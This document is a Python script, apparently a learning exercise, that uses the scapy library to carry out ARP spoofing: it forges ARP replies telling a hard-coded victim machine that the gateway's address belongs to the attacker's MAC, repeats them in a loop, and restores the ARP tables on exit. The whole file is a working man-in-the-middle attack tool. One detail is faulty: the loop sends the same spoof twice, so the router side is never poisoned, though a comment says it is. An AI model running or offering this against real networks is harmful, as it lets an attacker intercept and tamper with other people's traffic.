#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
def spoof(target_ip,spoof_ip):
    targetMac=getMAC(target_ip)
    packet=scapy.ARP(op=2, pdst=target_ip,hwdst=targetMac,psrc=spoof_ip,hwsrc="08:00:27:fc:4a:ad")
    #ARP packet
    #pdst= ip of target computer
    #op=2 sets it to a response not a request
    #hwdst is the victims mac address
    #psrc is the ip that the vicitm  believes the packet is from
    scapy.send(packet, verbose=False)
    #verbose= stops values from coming on the screen
    #sends packet to victim
#GETS MAC ADDRESS
def getMAC(ip):
    arp_request=scapy.ARP(pdst=ip)
    #creates a arp packet instance
    #pdst labels the the ip we are looking for
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #creates a ethernet object,sets destination MAC to broadcast MAC
    #dst sets the broadcast MAC Address
    arp_req_brd=broadcast/arp_request
    #combines the broadcast and arp request
    answered_list=scapy.srp(arp_req_brd,timeout=1, verbose=False)[0]
    #gives the first element of the two lists which is the answered lsit
    #Allows us to send packets with our own custom ether part
    #verbose keyword removes unneccesary information
    return answered_list[0][1].hwsrc
#METHOD BELOW IS HOW TO DYNAMICALLY PRINT
def dynamicPrint(count):
    print("\rSent " + str(count) + " packets"),
    # \r prints the information in the front of the line
    # the comma at the end puts the print in a buffer
    # tells router you are victim
    sys.stdout.flush()
    # it will instantly print the values in the buffer
#RESTORES THE ARP TABLES TO ORIGINAL IF PROGRAM IS QUIT
def restore(dest_ip,src_ip):
    packet=scapy.ARP(op=2, pdst=dest_ip,hwdst=getMAC(dest_ip),psrc=src_ip,hwsrc=getMAC(src_ip))
    scapy.send(packet,count=4,verbose =False)
#REPEATS SPOOF COMMAND
def spoofRepeat(boolT):
    trgtIP="192.168.1.23"
    gtwayIP="192.168.1.1"
    count=0;
    try:
        while boolT:
            spoof(trgtIP,gtwayIP)
            #tells victim you are router
            spoof(trgtIP,gtwayIP)
            count+=2
            dynamicPrint(count)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+]Quitting and Resetting ARP TABLES")
        restore(trgtIP,gtwayIP)
        restore(gtwayIP,trgtIP)
    #try-catch for execption
spoofRepeat(True)
